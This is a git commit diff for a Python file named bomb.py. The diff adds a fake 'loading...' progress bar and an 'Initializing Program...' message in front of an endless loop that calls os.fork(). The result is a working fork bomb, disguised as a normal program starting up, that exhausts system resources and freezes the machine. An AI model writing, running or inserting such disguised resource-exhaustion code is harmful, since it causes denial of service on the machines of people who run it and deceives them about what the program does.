1f84ffa7e3e002a451c17bd1e9988bbf755cfc16
Ars-btw <shaggyfino11@gmail.com>
2025-05-30 00:22:35 -0300

    Update bomb.py

--- bomb.py
+++ bomb.py
@@ -1,4 +1,14 @@
+import time
+import sys
 from os import fork
 
+
+for i in range(101):
+    print(f"\rloading...{i}%", end="")
+    sys.stdout.flush()
+    time.sleep(0.05)
+
+print("\n\nInitializing Program...")
+
 while True:
-	fork() 
+ 	fork()
